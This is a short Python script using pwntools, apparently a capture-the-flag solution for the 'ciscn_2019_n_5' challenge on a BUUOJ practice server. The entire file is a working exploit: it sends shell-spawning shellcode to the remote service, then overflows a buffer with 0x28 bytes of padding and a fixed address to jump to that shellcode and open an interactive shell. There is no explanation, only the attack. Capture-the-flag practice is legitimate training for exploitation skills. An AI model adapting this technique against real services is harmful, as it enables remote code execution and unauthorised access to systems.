from pwn import *

# p = process("./ciscn_2019_n_5")
p = remote("node4.buuoj.cn", 28245)


code_addr = 0x0601080
context(os="linux", arch="amd64")
code = asm(shellcraft.sh())


p.send(code)
p.recvuntil("What do you want to say to me?\n")
pad = cyclic(0x20+0x8)+p64(code_addr)
p.sendline(pad)

p.interactive()

